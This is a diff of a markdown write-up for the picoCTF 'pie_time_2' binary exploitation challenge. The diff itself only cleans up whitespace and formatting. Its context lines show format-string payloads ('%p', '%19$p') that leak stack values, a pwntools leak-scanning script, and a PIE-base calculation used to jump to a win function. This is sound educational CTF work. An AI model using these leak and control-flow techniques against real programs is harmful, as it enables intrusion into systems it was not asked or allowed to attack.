@@ -2,13 +2,13 @@
 title: pie_time_2
 description: Writeup for the pie_time_2 challenge in picoctf
 created: 2025-07-02
-tags: pwn, ctf, practice, picoctf  
+tags: pwn, ctf, practice, picoctf
 draft: false
 ---
 
 # Introduction
 
------
+---
 
 **challenge description**:
 
@@ -26,7 +26,7 @@ The challenge pie_time_2 is a binary exploitation problem released as part of pi
 
 # Enumeration
 
------
+---
 
 As with any engagement, we'll start by enumerating the target:
 
@@ -38,10 +38,10 @@ As with any engagement, we'll start by enumerating the target:
 </style>
 
 ```bash
-$ file ./vuln                                                                            
+$ file ./vuln
 ./vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364, for GNU/Linux 3.2.0, not stripped
 
-$ pwn checksec ./vuln                                                     
+$ pwn checksec ./vuln
 [*] './vuln'
     Arch:       amd64-64-little
     RELRO:      Full RELRO
@@ -52,7 +52,7 @@ $ pwn checksec ./vuln
     IBT:        Enabled
     Stripped:   No
 
-$ objdump -t ./vuln | grep -E ".text"           
+$ objdump -t ./vuln | grep -E ".text"
 00000000000011c0 l    d  .text  0000000000000000              .text
 00000000000011f0 l     F .text  0000000000000000              deregister_tm_clones
 0000000000001220 l     F .text  0000000000000000              register_tm_clones
@@ -71,7 +71,7 @@ Like [pie_time](pie_time.md), this binary has PIE enabled. Additionally, from th
 
 # Code Review
 
------
+---
 
 <details>
     <summary>vuln.c</summary>
@@ -143,7 +143,7 @@ Inside `call_functions`, we’re first prompted to enter our name. The `name` ch
 
 Unlike [pie_time](pie_time.md), this challenge doesn’t provide us with a memory leak we can use to directly calculate the PIE base address. However, there’s a **format string vulnerability** on line 15. **What is a format string vulnerability?** To answer that, let’s take a step back and first ask: **What is a format string?**
 
------
+---
 
 ## What is a Format String?
 
@@ -160,7 +160,6 @@ This code will print out:
 > "Hi! My name is 8ugz and I'm 42 years old!"
 
 But how does it do this? Let’s take a look at the [source code for `printf`](https://sourceware.org/git/?p=glibc.git;a=blob;f=stdio-common/printf.c;h=4c8f3a2a0c38ab27a2eed4d2ff3b804980aa8f9f;hb=3321010338384ecdc6633a8b032bb0ed6aa9b19a):
-
 
 ```c
 int
@@ -206,7 +205,7 @@ After the format specifier has been parsed, the values passed to `printf` are re
 
 </pre>
 
-You may notice that in `__printf`, something called `va_list` is initialized. In C, any function that takes a *variable number* of arguments is known as a **variadic function**. There’s a good explanation of the `va_*` family [here](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/va-arg-va-copy-va-end-va-start?view=msvc-170).
+You may notice that in `__printf`, something called `va_list` is initialized. In C, any function that takes a _variable number_ of arguments is known as a **variadic function**. There’s a good explanation of the `va_*` family [here](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/va-arg-va-copy-va-end-va-start?view=msvc-170).
 
 A `va_list` is simply the list of values passed to the variadic function. When using `va_arg`, a pointer to the current value is returned to the caller, and then the pointer is incremented to the next argument waiting to be read.
 
@@ -266,7 +265,7 @@ As a result, it blindly reads a value from memory where `age` is supposed to be.
 But what happens when a format string isn’t hard-coded in `printf`, and instead a user can supply it directly? What if the user can include format specifiers themselves? Let’s see:
 
 ```bash
-$ ./vuln 
+$ ./vuln
 Enter your name:%p
 0xa70
 ```
@@ -274,7 +273,7 @@ Enter your name:%p
 We successfully read a value from the stack. Let’s try printing even more values:
 
 ```bash
-$ ./vuln 
+$ ./vuln
 Enter your name:%p.%p.%p.%p.%p
 0x2e70252e70252e70.0xfbad2288.0x55d955ead2af.(nil).0x55d955ead2a0
 ```
@@ -286,7 +285,7 @@ We can see that we're able to read arbitrary memory from the stack. Instead of u
 For example:
 
 ```bash
-$ ./vuln 
+$ ./vuln
 Enter your name:%42$p
 0x7fff00000000
 ```
@@ -295,7 +294,7 @@ This allows us to precisely target and leak values at specific stack positions.
 
 # Exploitation
 
------
+---
 
 We now know that we can leak arbitrary memory from the stack using this format string vulnerability. This is perfect, because we'll first need to leak an address from memory to calculate the address of `win` and then jump to it.
 
@@ -380,7 +379,7 @@ SIZE = 32
 for i in range(1, SIZE + 1):
     try:
         p = process("./vuln", level="error")
-        
+
         payload = f"%{i}$p".encode("utf-8")
         p.sendlineafter(b"Enter your name:", payload)
         leak = p.recvline().decode("utf-8").strip()
@@ -396,7 +395,7 @@ for i in range(1, SIZE + 1):
 Running this script gives us a bunch of output:
 
 ```bash
-$ ./leak_stack.py 
+$ ./leak_stack.py
 1: 0xa702431
 2: 0xfbad2088
 3: 0x555cf15202a5
@@ -436,7 +435,7 @@ There’s an address that looks familiar, it ends with the recognizable 12 bits:
 This address appears at offset 19. Let’s verify that:
 
 ```bash
-$ ./vuln 
+$ ./vuln
 Enter your name:%19$p
 0x564a9fbe7441
 ```
@@ -460,7 +459,7 @@ Lastly, we just need the leaked address’s offset from `main`:
 ```bash
 (gdb) disass main
 Dump of assembler code for function main:
-   0x0000000000001400 <+0>:     endbr64 
+   0x0000000000001400 <+0>:     endbr64
    0x0000000000001404 <+4>:     push   rbp
    0x0000000000001405 <+5>:     mov    rbp,rsp
    0x0000000000001408 <+8>:     lea    rsi,[rip+0xfffffffffffffe9a]        # 0x12a9 <segfault_handler>
@@ -477,7 +476,7 @@ Dump of assembler code for function main:
    0x0000000000001441 <+65>:    mov    eax,0x0
    0x0000000000001446 <+70>:    pop    rbp
    0x0000000000001447 <+71>:    ret
-(gdb) p/x 0x0000000000001441 - 0x0000000000001400   
+(gdb) p/x 0x0000000000001441 - 0x0000000000001400
 $1 = 0x41
 ```
 
@@ -519,7 +518,7 @@ p.close()
 </details>
 
 ```bash
-$ ./get_pie.py 
+$ ./get_pie.py
 [+] Starting local process './vuln': pid 630
 [*] ret_ptr: 0x55657b6ef441
 [*] main_addr: 0x55657b6ef400
@@ -638,7 +637,7 @@ $ ./exploit.py
 
 # References
 
------
+---
 
 - [HackingLab - Format String Vulnerability](https://hackinglab.cz/en/blog/format-string-vulnerability/)
 - [ir0nstone - Format String Bug](https://ir0nstone.gitbook.io/notes/binexp/stack/format-string)
